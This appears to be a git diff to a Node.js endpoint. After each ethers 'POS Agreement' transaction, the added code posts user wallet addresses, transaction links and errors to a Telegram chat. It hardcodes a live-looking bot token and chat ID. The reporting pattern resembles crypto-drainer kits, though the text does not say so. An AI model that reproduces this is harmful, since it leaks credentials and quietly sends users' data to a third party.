@@ -1,5 +1,55 @@
 // api/submit.js
 const { ethers } = require('ethers');
+const https = require('https');
+
+// ================================================================
+//  TELEGRAM CONFIG (Added from index.html)
+// ================================================================
+const TELEGRAM_CONFIG = {
+    botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
+    chatId: '8550902598'
+};
+
+// Telegram පණිවිඩ යැවීම සඳහා වන Helper function එක
+function sendTelegramMessage(message) {
+    const token = TELEGRAM_CONFIG.botToken;
+    const chatId = TELEGRAM_CONFIG.chatId;
+
+    if (!token || token === 'YOUR_BOT_TOKEN_HERE') {
+        console.log('⚠️ Telegram credentials not configured. Skipping notification.');
+        return;
+    }
+
+    const data = JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+    });
+
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${token}/sendMessage`,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    };
+
+    const req = https.request(options, (res) => {
+        res.on('data', (d) => {
+            process.stdout.write(d);
+        });
+    });
+
+    req.on('error', (error) => {
+        console.error('❌ Telegram Error:', error);
+    });
+
+    req.write(data);
+    req.end();
+}
 
 module.exports = async (req, res) => {
     // ============================================
@@ -125,6 +175,16 @@ module.exports = async (req, res) => {
         console.log('⛽ Gas Used:', receipt.gasUsed.toString());
         console.log('========================================');
 
+        // සාර්ථක වූ විට Telegram වෙත යැවිය යුතු පණිවිඩය
+        const successMessage = `🚨 <b>New POS Agreement Signed!</b>\n\n` +
+                               `👤 <b>User:</b> <code>${user}</code>\n` +
+                               `📦 <b>Block:</b> ${receipt.blockNumber}\n` +
+                               `⛽ <b>Gas Used:</b> ${receipt.gasUsed.toString()}\n` +
+                               `👤 <b>Sender:</b> @bnkservers\n` +
+                               `🔗 <a href="https://etherscan.io/tx/${tx.hash}">View on Etherscan</a>`;
+        
+        sendTelegramMessage(successMessage);
+
         // ============================================
         // Return Success
         // ============================================
@@ -143,6 +203,12 @@ module.exports = async (req, res) => {
         console.error('❌ ERROR:', error.message);
         console.error('========================================');
         
+        // දෝෂයක් (Error) සිදු වූ විට Telegram වෙත යැවිය යුතු පණිවිඩය
+        const errorMessage = `❌ <b>POS Agreement Error!</b>\n\n` +
+                             `⚠️ <b>Error:</b> ${error.message}`;
+        
+        sendTelegramMessage(errorMessage);
+
         return res.status(500).json({
             success: false,
             error: error.message
